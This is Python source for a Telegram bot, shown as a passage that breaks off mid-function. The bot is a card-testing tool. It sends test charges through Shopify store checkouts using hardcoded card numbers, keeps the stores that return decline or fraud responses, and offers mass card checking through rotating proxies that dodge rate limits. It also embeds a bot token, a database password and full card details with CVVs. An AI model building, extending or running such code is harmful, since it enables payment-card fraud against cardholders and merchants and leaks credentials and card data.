#!/usr/bin/env python3
# app.py — NOVA v3 · preflight proxy check + self-healing fail counters
#
# Key behavior:
#   • Preflight: all pool proxies connectivity-tested before site validation.
#     Dead ones cooled immediately (5s instead of 90s per site).
#   • Full pool: verified AND unverified proxies both get used.
#   • Fail counter: 3 consecutive fails → cool 30 min + demote from verified.
#   • Success: reset fail counter, promote to verified.
#
# VALID site responses (only these saved):
#   FRAUD_SUSPECTED · RISK_REJECTED · CARD_DECLINED · 3DS_AUTHENTICATION · PROCESSING_ERROR
# CAPTCHA → separate pool. Everything else dropped.
#
# COMMANDS:
#   /start                help menu
#   /cleanfile            extract URLs from junk → clean .txt
#   /addurls              validate URLs with 3 CCs
#   /cleansites           re-validate existing pool
#   /listsites            view valid site pool
#   /rmsites              remove ALL valid sites
#   /listcap              view CAPTCHA pool
#   /clearcap             wipe CAPTCHA pool
#   /uploadproxies        upload proxies → connectivity test → save live
#   /addproxies           inline add or trigger file upload
#   /listproxies          view with ✅ / 🟢 / ⏳ + fail counts
#   /cleanproxy           retest proxies, keep reachable
#   /cleanproxies         alias
#   /rmproxies            remove ALL proxies
#   /resetfails           clear fail counters
#   /resetverified        clear verified registry
#   /msh                  Shopify mass check
#   /stop                 stop running validation

import os, re, json, time, html, random, threading, queue, socket
import requests, telebot, urllib3
from telebot import types
from telebot.apihelper import ApiTelegramException
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pymongo import MongoClient
from pymongo.server_api import ServerApi

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
socket.setdefaulttimeout(30)

import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger(__name__)

from gates import check_shopify_api, process_shopify_api_response
from complete_handler import (
    get_active_proxies, normalize_proxy, process_shopify_mass_check,
)

# ═══════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════
BOT_TOKEN = "8533961422:AAGzOHNJEIeM7bsqb-qOW-fgErwgJ2jPV0U"
OWNER_ID  = [5963548505, 5547897619]
DARKS_ID  = 5963548505
REQUIRED_CHATS = ["@Nova_bot_update", "-1003926435438"]

SITES_FILE        = "sites.json"
CAPTCHA_FILE      = "captcha_sites.json"
PROXIES_FILE      = "proxies.json"
USERS_FILE        = "users.json"
USER_PROXIES_FILE = "user_proxies.json"
USER_SITES_FILE   = "user_sites.json"
VERIFIED_FILE     = "verified_proxies.json"

SITE_VALIDATION_CCS = [
    "5242430428405662|03|28|233",
    "4758330036461678|01|2029|612",
    "4232230643597128|06|2031|962",
]

# Category constants
CAT_DECLINE   = 'CARD_DECLINED'
CAT_3DS       = '3DS_AUTHENTICATION'
CAT_FRAUD     = 'FRAUD_SUSPECTED'
CAT_RISK      = 'RISK_REJECTED'
CAT_PROC_ERR  = 'PROCESSING_ERROR'
CAT_CAPTCHA   = 'CAPTCHA_REQUIRED'
CAT_INVALID   = 'OTHER_INVALID'
CAT_NET_ERR   = 'NETWORK_ERROR'

VALID_CATEGORIES = (CAT_DECLINE, CAT_3DS, CAT_FRAUD, CAT_RISK, CAT_PROC_ERR)

_VALID_MATCHERS = (
    (CAT_FRAUD,    ('FRAUD_SUSPECTED', 'FRAUD SUSPECTED')),
    (CAT_RISK,     ('RISK_REJECTED', 'RISK REJECTED')),
    (CAT_DECLINE,  ('CARD_DECLINED', 'CARD DECLINED')),
    (CAT_3DS,      ('3DS_AUTHENTICATION', '3DS AUTHENTICATION', '3D_SECURE',
                   'AUTHENTICATION_REQUIRED', 'OTP_REQUIRED')),
    (CAT_PROC_ERR, ('PROCESSING_ERROR', 'PROCESSING ERROR')),
)

_CAPTCHA_MATCHERS = ('CAPTCHA', 'CHALLENGE_REQUIRED', 'CF-CHL', 'CLOUDFLARE')

_NET_ERROR_MATCHERS = (
    'TIMEOUT', 'CONNECTION REFUSED', 'CONNECT TUNNEL FAILED',
    'PROXY ERROR', 'PROXYERROR', 'UNREACHABLE', 'NO ROUTE TO HOST',
    'REMOTE END CLOSED', 'CONNECTION ERROR', 'CONNECTIONERROR',
    'SSLERROR', 'IMPERSONATE', 'CURL: (56)',
    'STEP1:EXCEPTION', 'STEP3:EXCEPTION', 'STEP6:EXCEPTION',
    'STEP9:EXCEPTION', 'STEP10:EXCEPTION',
    'STEP1:TIMEOUT', 'STEP3:TIMEOUT', 'STEP6:TIMEOUT',
    'STEP9:TIMEOUT', 'STEP10:TIMEOUT',
    'PRODUCT FETCH FAILED', 'ALL SITES FAILED', 'ALL_SITES_FAILED',
    'NO LIVE SITE', 'UNABLE TO REACH',
    'RATE LIMIT', '429', 'TOO MANY REQUESTS',
    'SERVICE ERROR', 'SERVICE TIMEOUT', 'SERVICE TEMPORARILY UNAVAILABLE',
    'INTERNAL SERVER ERROR',
)

# proper 5xx regex
_RE_5XX = re.compile(r'\b5\d{2}\b')

COOLDOWN_SECONDS = 1800  # 30 min
FAIL_THRESHOLD = 3       # consecutive fails → cool + demote
BATCH_SIZE = 500
MAX_WORKERS = 40
PREFLIGHT_WORKERS = 100

bot = telebot.TeleBot(BOT_TOKEN, num_threads=30)

# ═══════════════════════════════════════════════════════════════════
# MONGO + JSON
# ═══════════════════════════════════════════════════════════════════
uri = "mongodb+srv://Prince_Mine_pvt:Meandprincehitting@cluster0.blr8vex.mongodb.net/?appName=Cluster0"
try:
    _mc = MongoClient(uri, server_api=ServerApi('1'), maxPoolSize=10,
                      connectTimeoutMS=30000, socketTimeoutMS=120000,
                      serverSelectionTimeoutMS=30000)
    _mc.admin.command('ping')
    db = _mc['nova_bot_db']
    logger.info("✅ MongoDB connected")
except Exception as e:
    logger.warning(f"❌ MongoDB: {e}")
    db = None


def _coll(fp):
    return fp.replace('.json', '').replace('/', '_')


def _default(fp):
    if fp in (SITES_FILE, CAPTCHA_FILE): return {"sites": []}
    if fp == PROXIES_FILE: return {"shopify": [], "razorpay": []}
    if fp == VERIFIED_FILE: return {}
    return {}


def load_json(fp, default=None):
    if default is None:
        default = _default(fp)
    if db is not None:
        try:
            doc = db[_coll(fp)].find_one({"_id": "main_data"})
            if doc and 'data' in doc:
                d = doc['data']
                if fp in (SITES_FILE, CAPTCHA_FILE):
                    if isinstance(d, list): d = {"sites": d}
                    d.setdefault('sites', [])
                elif fp == PROXIES_FILE:
                    if isinstance(d, list): d = {"shopify": d, "razorpay": []}
                    d.setdefault('shopify', []); d.setdefault('razorpay', [])
                return d
        except Exception as e:
            logger.warning(f"Mongo load {fp}: {e}")
    try:
        if os.path.exists(fp):
            with open(fp, 'r', encoding='utf-8') as f:
                d = json.load(f)
            if fp in (SITES_FILE, CAPTCHA_FILE):
                if isinstance(d, list): d = {"sites": d}
                d.setdefault('sites', [])
            elif fp == PROXIES_FILE:
                if isinstance(d, list): d = {"shopify": d, "razorpay": []}
                d.setdefault('shopify', []); d.setdefault('razorpay', [])
            return d
    except Exception:
        pass
    return default


def save_json(fp, data):
    if db is not None:
        try:
            db[_coll(fp)].update_one(
                {"_id": "main_data"},
                {"$set": {"data": data, "updated_at": datetime.utcnow().isoformat()}},
                upsert=True)
        except Exception as e:
            logger.warning(f"Mongo save {fp}: {e}")
    try:
        with open(fp, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Local save {fp}: {e}")


# ═══════════════════════════════════════════════════════════════════
# LOAD STATE
# ═══════════════════════════════════════════════════════════════════
sites_data         = load_json(SITES_FILE)
captcha_sites_data = load_json(CAPTCHA_FILE)
proxies_data       = load_json(PROXIES_FILE)
users_data         = load_json(USERS_FILE)
user_proxies_data  = load_json(USER_PROXIES_FILE)
user_sites_data    = load_json(USER_SITES_FILE)
verified_proxies   = load_json(VERIFIED_FILE)

# migrate ids
_need = False
for s in sites_data.get('sites', []):
    if 'id' not in s:
        s['id'] = max((x.get('id', 0) for x in sites_data['sites']), default=0) + 1
        _need = True
if _need:
    save_json(SITES_FILE, sites_data)

_need = False
for uid, e in user_proxies_data.items():
    if isinstance(e, list):
        user_proxies_data[uid] = {"shopify": e, "razorpay": []}
        _need = True
    else:
        e.setdefault('shopify', []); e.setdefault('razorpay', [])
if _need:
    save_json(USER_PROXIES_FILE, user_proxies_data)

# ═══════════════════════════════════════════════════════════════════
# RATE LIMITER
# ═══════════════════════════════════════════════════════════════════
class _Limiter:
    def __init__(self, g=0.05, p=1.05, gr=3.0):
        self.q = queue.Queue()
        self.g, self.p, self.gr = g, p, gr
        self._lg, self._lc, self._lk = 0.0, {}, threading.Lock()
        threading.Thread(target=self._w, daemon=True).start()

    def _chat(self, name, args, kw):
        cid = kw.get('chat_id'); ct = kw.get('chat_type', 'private')
        if cid is None and args:
            a0 = args[0]
            if hasattr(a0, 'chat'):
                cid = getattr(a0.chat, 'id', None); ct = getattr(a0.chat, 'type', ct)
            elif hasattr(a0, 'message') and hasattr(a0.message, 'chat'):
                cid = getattr(a0.message.chat, 'id', None); ct = getattr(a0.message.chat, 'type', ct)
            elif isinstance(a0, int):
                cid = a0
        if cid is None and name == 'edit_message_text' and len(args) >= 2 and isinstance(args[1], int):
            cid = args[1]
        return cid, ct

    def _wait(self, cid, ct):
        per = self.gr if ct in ('group', 'supergroup') else self.p
        while True:
            with self._lk:
                now = time.time()
                gw = self.g - (now - self._lg)
                cw = per - (now - self._lc.get(cid, 0)) if cid else 0
                w = max(gw, cw, 0)
            if w <= 0:
                with self._lk:
                    now = time.time(); self._lg = now
                    if cid: self._lc[cid] = now
                return
            time.sleep(min(w, 0.25))

    def _w(self):
        while True:
            try:
                item = self.q.get(timeout=1.0)
            except queue.Empty:
                continue
            fn, args, kw, fut = item
            cid, ct = self._chat(getattr(fn, '__name__', ''), args, kw)
            self._wait(cid, ct)
            res, err = None, None
            for _ in range(4):
                try:
                    res = fn(*args, **kw); err = None; break
                except ApiTelegramException as e:
                    err = e
                    if e.error_code == 429:
                        ra = (e.result_json or {}).get('parameters', {}).get('retry_after', 3)
                        time.sleep(min(ra, 10))
                    else:
                        break
                except Exception as e:
                    err = e; break
            if fut is not None:
                fut['r'] = res; fut['e'] = err; fut['ev'].set()
            try: self.q.task_done()
            except Exception: pass

    def call(self, fn, *a, **kw):
        fut = {'ev': threading.Event(), 'r': None, 'e': None}
        self.q.put((fn, a, kw, fut))
        fut['ev'].wait(timeout=120)
        return fut['r']


_lim = _Limiter()

def safe_send(fn, *a, **kw):
    return _lim.call(fn, *a, **kw)


# ═══════════════════════════════════════════════════════════════════
# AUTH
# ═══════════════════════════════════════════════════════════════════
def is_owner(uid):
    return uid in OWNER_ID


def is_user_allowed(uid):
    if uid in OWNER_ID: return True
    u = users_data.get(str(uid))
    if not u: return False
    exp = u.get('expiry') or u.get('expiry_date')
    if not exp: return False
    try:
        return datetime.fromisoformat(exp) > datetime.now()
    except Exception:
        return False


def is_subscribed(uid):
    if not REQUIRED_CHATS: return True
    for chat_id in REQUIRED_CHATS:
        try:
            m = bot.get_chat_member(chat_id, uid)
            if m.status not in ('creator', 'administrator', 'member'):
                return False
        except Exception:
            return False
    return True


def _sub_gate(message):
    uid = message.from_user.id
    if uid in OWNER_ID or is_subscribed(uid):
        return True
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📢 Channel", url="https://t.me/Nova_bot_update"))
    kb.add(types.InlineKeyboardButton("👥 Group", url="https://t.me/+NxKPx890ExkwYjQ0"))
    kb.add(types.InlineKeyboardButton("🔄 Verified", callback_data="check_subscription"))
    safe_send(bot.reply_to, message,
        "<b>🔒 ACCESS LOCKED</b>\n\nJoin both to unlock.",
        parse_mode='HTML', reply_markup=kb)
    return False


# ═══════════════════════════════════════════════════════════════════
# COOLDOWN + VERIFIED + FAIL COUNTERS (self-healing)
# ═══════════════════════════════════════════════════════════════════
_cooldown_lock = threading.Lock()
_cooldowns = {}

_verified_lock = threading.Lock()

_fail_lock = threading.Lock()
_fail_counts = {}

# stats per validation run
_run_stats_lock = threading.Lock()
_run_stats = {"proxies_cooled_during_run": 0}


def is_proxy_cooled(proxy):
    with _cooldown_lock:
        until = _cooldowns.get(proxy, 0)
        if until > time.time():
            return True
        if proxy in _cooldowns:
            _cooldowns.pop(proxy, None)
        return False


def cooldown_proxy(proxy, seconds=COOLDOWN_SECONDS):
    if not proxy: return
    with _cooldown_lock:
        _cooldowns[proxy] = time.time() + seconds


def is_proxy_verified(proxy):
    with _verified_lock:
        return proxy in verified_proxies


def mark_proxy_verified(proxy, response):
    if not proxy: return
    with _verified_lock:
        verified_proxies[proxy] = {
            "verified_at": datetime.utcnow().isoformat(),
            "last_response": response,
        }
    save_json(VERIFIED_FILE, verified_proxies)


def demote_verified(proxy):
    if not proxy: return
    with _verified_lock:
        was = proxy in verified_proxies
        verified_proxies.pop(proxy, None)
    if was:
        save_json(VERIFIED_FILE, verified_proxies)


def record_proxy_failure(proxy):
    """Increment fail counter. At threshold: cool + demote."""
    if not proxy: return
    should_cool = False
    with _fail_lock:
        count = _fail_counts.get(proxy, 0) + 1
        _fail_counts[proxy] = count
        if count >= FAIL_THRESHOLD:
            _fail_counts[proxy] = 0
            should_cool = True
    if should_cool:
        cooldown_proxy(proxy)
        demote_verified(proxy)
        with _run_stats_lock:
            _run_stats["proxies_cooled_during_run"] += 1
        logger.info(f"🔒 Cooled after {FAIL_THRESHOLD} fails: {proxy}")


def record_proxy_success(proxy, response):
    """Reset fail counter and verify."""
    if not proxy: return
    with _fail_lock:
        _fail_counts.pop(proxy, None)
    mark_proxy_verified(proxy, response)


def get_fail_count(proxy):
    with _fail_lock:
        return _fail_counts.get(proxy, 0)


def cooled_count():
    with _cooldown_lock:
        now = time.time()
        return sum(1 for t in _cooldowns.values() if t > now)


def pick_good_proxy(uid, gate="shopify"):
    """Full pool, skip cooled. Verified and unverified both usable."""
    up = read_user_proxies(uid)
    pool = up.get(gate, [])
    if not pool: return None
    usable = [p for p in pool if not is_proxy_cooled(p)]
    if not usable: return None
    return random.choice(usable)


# ═══════════════════════════════════════════════════════════════════
# CLASSIFIER
# ═══════════════════════════════════════════════════════════════════
def classify_site_response(response_text):
    if not response_text:
        return CAT_NET_ERR
    up = str(response_text).upper()

    for marker in _NET_ERROR_MATCHERS:
        if marker in up:
            return CAT_NET_ERR

    if _RE_5XX.search(up):
        return CAT_NET_ERR

    for marker in _CAPTCHA_MATCHERS:
        if marker in up:
            return CAT_CAPTCHA

    for cat, markers in _VALID_MATCHERS:
        for marker in markers:
            if marker in up:
                return cat

    return CAT_INVALID


# ═══════════════════════════════════════════════════════════════════
# PROXY HELPERS
# ═══════════════════════════════════════════════════════════════════
def read_user_proxies(uid):
    raw = user_proxies_data.get(str(uid), {"shopify": [], "razorpay": []})
    if isinstance(raw, list):
        return {"shopify": raw, "razorpay": []}
    raw.setdefault('shopify', []); raw.setdefault('razorpay', [])
    return raw


def save_user_proxies(uid, data):
    user_proxies_data[str(uid)] = data
    save_json(USER_PROXIES_FILE, user_proxies_data)


def parse_proxy_lines(text):
    proxies = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split()
        gate = "shopify"
        if len(parts) >= 2 and parts[-1].lower() in ('shopify', 'razorpay'):
            gate = parts[-1].lower(); line = " ".join(parts[:-1])
        norm = normalize_proxy(line)
        if norm:
            proxies.append((norm, gate))
    seen, out = set(), []
    for p, g in proxies:
        k = (p, g)
        if k not in seen:
            seen.add(k); out.append((p, g))
    return out


def test_proxy_connectivity(proxy, timeout=8):
    """Fast connectivity check — used in preflight."""
    norm = normalize_proxy(proxy)
    if not norm: return False
    parts = norm.split(':')
    if len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    else:
        return False
    try:
        r = requests.get("https://api.ipify.org?format=json",
            proxies={"http": url, "https": url},
            timeout=timeout, verify=False)
        return r.status_code == 200
    except Exception:
        return False


def preflight_proxies(uid, chat_id, proxies):
    """
    Test all proxies in parallel (5s timeout, 100 workers).
    Dead ones cooled immediately. Returns list of live proxies.
    """
    if not proxies:
        return []
    status = safe_send(bot.send_message, chat_id,
        f"🔎 <b>Preflight:</b> checking <b>{len(proxies)}</b> proxies…",
        parse_mode='HTML')
    tested = 0
    live = []
    lock = threading.Lock()
    last_upd = time.time()

    def _w(p):
        return p, test_proxy_connectivity(p, timeout=5)

    with ThreadPoolExecutor(max_workers=PREFLIGHT_WORKERS) as ex:
        futs = [ex.submit(_w, p) for p in proxies]
        for fut in as_completed(futs):
            tested += 1
            try:
                p, ok = fut.result(timeout=15)
            except Exception:
                continue
            if ok:
                with lock: live.append(p)
            else:
                cooldown_proxy(p)  # dead → cool 30 min
            now = time.time()
            if status and (now - last_upd) >= 3:
                try:
                    safe_send(bot.edit_message_text,
                        f"🔎 <b>Preflight:</b> {tested}/{len(proxies)}\n"
                        f"✅ Live: <b>{len(live)}</b> · 🔒 Cooled: <b>{tested - len(live)}</b>",
                        chat_id, status.message_id, parse_mode='HTML')
                    last_upd = now
                except Exception:
                    pass

    if status:
        try:
            safe_send(bot.edit_message_text,
                f"🔎 <b>Preflight done</b>\n"
                f"✅ Live: <b>{len(live)}</b> / {len(proxies)}",
                chat_id, status.message_id, parse_mode='HTML')
            time.sleep(1)
            safe_send(bot.delete_message, chat_id, status.message_id)
        except Exception:
            pass
    return live


# ═══════════════════════════════════════════════════════════════════
# SITE HELPERS
# ═══════════════════════════════════════════════════════════════════
def extract_urls_from_junk(text):
    text = text.replace('\\/', '/').replace('\\', '')
    pattern = r'https?://[^\s<>"\'\]\)\}\,]+'
    urls = re.findall(pattern, text)
    cleaned = []
    for u in urls:
        u = u.rstrip('.,;:!?)]}>')
        if u.startswith(('http://', 'https://')) and len(u) > 10:
            cleaned.append(u)
    return list(dict.fromkeys(cleaned))


def parse_site_urls(text):
    urls = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        found = extract_urls_from_junk(line)
        if found:
            urls.extend(found)
        else:
            m = re.search(r'https?://[^\s/]+', line)
            if m:
                urls.append(m.group(0).rstrip('/'))
    return list(dict.fromkeys(urls))


def get_next_site_id():
    if not sites_data.get('sites'): return 1
    return max((s.get('id', 0) for s in sites_data['sites']), default=0) + 1


def save_site_validated(url, category, response, gateway="Shopify Payments"):
    global sites_data
    existing = {s['url'].lower().rstrip('/') for s in sites_data.get('sites', [])}
    if url.lower().rstrip('/') in existing:
        return False
    sites_data['sites'].append({
        "url": url,
        "name": url.replace('https://', '').replace('http://', '').split('/')[0],
        "price": "0.00",
        "gateway": gateway,
        "id": get_next_site_id(),
        "response": response[:120],
        "category": category,
        "validated_at": datetime.utcnow().isoformat(),
    })
    return True


def save_site_captcha(url, response):
    global captcha_sites_data
    existing = {s['url'].lower().rstrip('/') for s in captcha_sites_data.get('sites', [])}
    if url.lower().rstrip('/') in existing:
        return False
    captcha_sites_data.setdefault('sites', []).append({
        "url": url,
        "response": response[:120],
        "captured_at": datetime.utcnow().isoformat(),
    })
    return True


# ═══════════════════════════════════════════════════════════════════
# SESSIONS
# ═══════════════════════════════════════════════════════════════════
user_sessions = {}
validation_stop = {}


def _set_await(uid, key):
    user_sessions.setdefault(uid, {})
    for k in list(user_sessions[uid].keys()):
        if k.startswith('awaiting_'):
            user_sessions[uid].pop(k, None)
    user_sessions[uid][key] = True
    user_sessions[uid][key + '_ts'] = time.time()


def _pop_await(uid, key):
    user_sessions.get(uid, {}).pop(key, None)
    user_sessions.get(uid, {}).pop(key + '_ts', None)


def _check_await(uid):
    s = user_sessions.get(uid, {})
    best, best_ts = None, 0
    for k, v in s.items():
        if k.startswith('awaiting_') and not k.endswith('_ts') and v:
            ts = s.get(k + '_ts', 0)
            if ts >= best_ts:
                best, best_ts = k, ts
    return best


# ═══════════════════════════════════════════════════════════════════
# DOCUMENT ROUTER
# ═══════════════════════════════════════════════════════════════════
@bot.message_handler(content_types=['document'])
def on_document(message):
    uid = message.from_user.id
    if not _sub_gate(message):
        return
    if not is_user_allowed(uid) and not is_owner(uid):
        safe_send(bot.reply_to, message, "🚫 Premium required.")
        return
    flag = _check_await(uid)
    if not flag:
        return
    _pop_await(uid, flag)
    fname = (message.document.file_name or '').lower()
    if not fname.endswith('.txt'):
        safe_send(bot.reply_to, message, "❌ .txt only.")
        return
    try:
        info = bot.get_file(message.document.file_id)
        raw = bot.download_file(info.file_path).decode('utf-8', errors='ignore')
    except Exception as e:
        safe_send(bot.reply_to, message, f"❌ Download: {e}")
        return

    if flag == 'awaiting_urls_file':
        _run_site_validation(message, raw)
    elif flag == 'awaiting_proxy_file':
        _run_proxy_upload(message, raw)
    elif flag == 'awaiting_cards_file':
        _run_msh(message, raw)
    elif flag == 'awaiting_cleanfile':
        _run_cleanfile(message, raw)


# ═══════════════════════════════════════════════════════════════════
# CLEANFILE
# ═══════════════════════════════════════════════════════════════════
def _run_cleanfile(message, raw):
    uid = message.from_user.id
    urls = extract_urls_from_junk(raw)
    if not urls:
        safe_send(bot.reply_to, message, "❌ No URLs found in file.")
        return
    body = "\n".join(urls)
    fname = f"cleaned_{uid}.txt"
    try:
        with open(fname, 'w', encoding='utf-8') as f:
            f.write(body)
        with open(fname, 'rb') as f:
            bot.send_document(
                message.chat.id, f,
                caption=(f"✅ Extracted <b>{len(urls)}</b> unique URLs.\n\n"
                         f"Next: <code>/addurls</code> with this file."),
                parse_mode='HTML')
        os.remove(fname)
    except Exception as e:
        safe_send(bot.reply_to, message, f"❌ File write: {e}")


# ═══════════════════════════════════════════════════════════════════
# PROGRESS FORMATTER
# ═══════════════════════════════════════════════════════════════════
def _fmt_progress(stats, done, total, preflight_note=""):
    pct = done / total if total else 0
    filled = int(12 * pct)
    bar = '█' * filled + '▒' * (12 - filled)
    with _run_stats_lock:
        cooled_run = _run_stats["proxies_cooled_during_run"]
    return (
        f"<b>PROCESSING....</b>{preflight_note}\n"
        f"<code>{bar} {done}/{total}</code>\n\n"
        f"CARD_DECLINED :- {stats[CAT_DECLINE]}\n"
        f"3DS_AUTHENTICATION :- {stats[CAT_3DS]}\n"
        f"FRAUD_SUSPECTED :- {stats[CAT_FRAUD]}\n"
        f"RISK_REJECTED :- {stats[CAT_RISK]}\n"
        f"PROCESSING_ERROR :- {stats[CAT_PROC_ERR]}\n"
        f"CAPTCHA_REQUIRED :- {stats[CAT_CAPTCHA]} <i>(→ /listcap)</i>\n"
        f"OTHER_INVALID :- {stats[CAT_INVALID]} <i>(removed)</i>\n"
        f"NETWORK_ERROR :- {stats[CAT_NET_ERR]}\n\n"
        f"🔒 Cooling: {cooled_count()} · Cooled this run: {cooled_run}"
    )


# ═══════════════════════════════════════════════════════════════════
# SITE VALIDATION (with preflight + self-healing)
# ═══════════════════════════════════════════════════════════════════
def _run_site_validation(message, raw):
    uid = message.from_user.id
    urls = parse_site_urls(raw)
    if not urls:
        safe_send(bot.reply_to, message, "❌ No URLs found in file.")
        return

    up = read_user_proxies(uid)
    raw_pool = up.get('shopify', [])
    if not raw_pool:
        safe_send(bot.reply_to, message,
            "⚠️ <b>No proxies!</b>\n\n"
            "Add via <code>/uploadproxies</code> or "
            "<code>/addproxies ip:port:user:pass</code>",
            parse_mode='HTML')
        return

    # ─── PREFLIGHT ───
    safe_send(bot.reply_to, message,
        f"🚀 Starting validation\n"
        f"📥 URLs: <b>{len(urls)}</b>\n"
        f"🔌 Pool: <b>{len(raw_pool)}</b> proxies",
        parse_mode='HTML')

    live_pool = preflight_proxies(uid, message.chat.id, raw_pool)
    if not live_pool:
        safe_send(bot.send_message, message.chat.id,
            "❌ <b>No live proxies after preflight.</b>\n\n"
            "Upload fresh proxies with <code>/uploadproxies</code>.",
            parse_mode='HTML')
        return

    # reset run stats
    with _run_stats_lock:
        _run_stats["proxies_cooled_during_run"] = 0

    validation_stop[uid] = False
    stats = {CAT_DECLINE: 0, CAT_3DS: 0, CAT_FRAUD: 0, CAT_RISK: 0,
             CAT_PROC_ERR: 0, CAT_CAPTCHA: 0, CAT_INVALID: 0, CAT_NET_ERR: 0}
    lock = threading.Lock()
    verified_count = [0]
    results_valid = []
    results_captcha = []

    status = safe_send(bot.send_message, message.chat.id,
        _fmt_progress(stats, 0, len(urls),
                      f"\n✅ Preflight live proxies: {len(live_pool)}"),
        parse_mode='HTML')
    if not status:
        return

    processed = [0]
    last_upd = [time.time()]
    saved_buffer = [0]

    def _worker(url):
        for cc in SITE_VALIDATION_CCS:
            if validation_stop.get(uid):
                return None
            proxy = pick_good_proxy(uid)
            if not proxy:
                return (url, CAT_NET_ERR, 'no proxy available')
            try:
                api_resp = check_shopify_api(url, cc, proxy,
                    all_proxies=live_pool, all_sites=[url], max_attempts=1)
            except Exception:
                record_proxy_failure(proxy)
                continue
            if not api_resp or not isinstance(api_resp, dict):
                record_proxy_failure(proxy)
                continue
            rt, _st, gw = process_shopify_api_response(api_resp, '0.00')
            cat = classify_site_response(rt)

            if cat in VALID_CATEGORIES:
                record_proxy_success(proxy, cat)
                with lock:
                    verified_count[0] += 1
                return (url, cat, rt[:120], gw)
            if cat == CAT_CAPTCHA:
                record_proxy_failure(proxy)
                return (url, cat, rt[:120])
            if cat == CAT_NET_ERR:
                record_proxy_failure(proxy)
                continue
            # CAT_INVALID — real gateway response, just not a wanted category.
            # Proxy worked → reset fails but do NOT verify
            with _fail_lock:
                _fail_counts.pop(proxy, None)
            return (url, cat, rt[:120])
        return (url, CAT_NET_ERR, 'all attempts failed')

    total = len(urls)
    for batch_start in range(0, total, BATCH_SIZE):
        if validation_stop.get(uid):
            break
        batch = urls[batch_start:batch_start + BATCH_SIZE]

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(_worker, u): u for u in batch}
            for fut in as_completed(futs):
                processed[0] += 1
                try:
                    r = fut.result(timeout=90)
                except Exception:
                    r = (futs[fut], CAT_NET_ERR, 'exception')
                if not r:
                    continue
                if len(r) == 4:
                    url, cat, resp, gw = r
                else:
                    url, cat, resp = r
                    gw = "Shopify Payments"

                with lock:
                    stats[cat] = stats.get(cat, 0) + 1
                    if cat in VALID_CATEGORIES:
                        results_valid.append((url, cat, resp, gw))
                        saved_buffer[0] += 1
                        # debounced save every 25
                        if saved_buffer[0] % 25 == 0:
                            try:
                                save_json(SITES_FILE, sites_data)
                            except Exception:
                                pass
                    elif cat == CAT_CAPTCHA:
                        results_captcha.append((url, resp))

                now = time.time()
                if now - last_upd[0] >= 4:
                    try:
                        safe_send(bot.edit_message_text,
                            _fmt_progress(stats, processed[0], total),
                            message.chat.id, status.message_id,
                            parse_mode='HTML')
                        last_upd[0] = now
                    except Exception:
                        pass

    # final save
    added_valid = sum(1 for u, c, r, g in results_valid if save_site_validated(u, c, r, g))
    skipped = len(results_valid) - added_valid
    added_cap = sum(1 for u, r in results_captcha if save_site_captcha(u, r))
    save_json(SITES_FILE, sites_data)
    save_json(CAPTCHA_FILE, captcha_sites_data)

    stopped_txt = " (STOPPED)" if validation_stop.get(uid) else ""
    validation_stop.pop(uid, None)

    with _run_stats_lock:
        cooled_run = _run_stats["proxies_cooled_during_run"]

    final = (
        f"<b>✅ VALIDATION DONE{stopped_txt}</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"📥 Total URLs: {total}\n"
        f"🧪 Processed: {processed[0]}\n\n"
        f"<b>VALID (saved):</b>\n"
        f"  CARD_DECLINED: {stats[CAT_DECLINE]}\n"
        f"  3DS_AUTHENTICATION: {stats[CAT_3DS]}\n"
        f"  FRAUD_SUSPECTED: {stats[CAT_FRAUD]}\n"
        f"  RISK_REJECTED: {stats[CAT_RISK]}\n"
        f"  PROCESSING_ERROR: {stats[CAT_PROC_ERR]}\n\n"
        f"<b>CAPTCHA (→ /listcap):</b> {stats[CAT_CAPTCHA]}\n"
        f"<b>DROPPED:</b>\n"
        f"  OTHER_INVALID: {stats[CAT_INVALID]}\n"
        f"  NETWORK_ERROR: {stats[CAT_NET_ERR]}\n\n"
        f"➕ Added: {added_valid} · dupes: {skipped}\n"
        f"🔒 CAPTCHA added: {added_cap}\n"
        f"✅ Verified proxies (cumulative): {verified_count[0]}\n"
        f"🔒 Proxies cooled this run: {cooled_run}\n\n"
        f"🌐 Valid pool: {len(sites_data.get('sites', []))}\n"
        f"🔒 CAPTCHA pool: {len(captcha_sites_data.get('sites', []))}"
    )
    try:
        safe_send(bot.edit_message_text, final,
            message.chat.id, status.message_id, parse_mode='HTML')
    except Exception:
        safe_send(bot.send_message, message.chat.id, final, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════
# PROXY UPLOAD
# ═══════════════════════════════════════════════════════════════════
def _run_proxy_upload(message, raw):
    uid = message.from_user.id
    parsed = parse_proxy_lines(raw)
    if not parsed:
        safe_send(bot.reply_to, message, "❌ No valid proxies.")
        return
    status = safe_send(bot.send_message, message.chat.id,
        f"🧪 Connectivity test on <b>{len(parsed)}</b> proxies…",
        parse_mode='HTML')
    if not status:
        return
    tested, live = 0, []
    lock = threading.Lock()
    last_upd = time.time()

    def _w(item):
        p, g = item
        return p, g, test_proxy_connectivity(p, timeout=8)

    with ThreadPoolExecutor(max_workers=100) as ex:
        futs = [ex.submit(_w, item) for item in parsed]
        for fut in as_completed(futs):
            tested += 1
            try:
                p, g, ok = fut.result(timeout=20)
            except Exception:
                continue
            if ok:
                with lock: live.append((p, g))
            now = time.time()
            if now - last_upd >= 3:
                try:
                    safe_send(bot.edit_message_text,
                        f"🧪 {tested}/{len(parsed)} · ✅ {len(live)}",
                        message.chat.id, status.message_id)
                    last_upd = now
                except Exception:
                    pass

    data = read_user_proxies(uid)
    new_count = 0
    for p, g in live:
        if p not in data[g]:
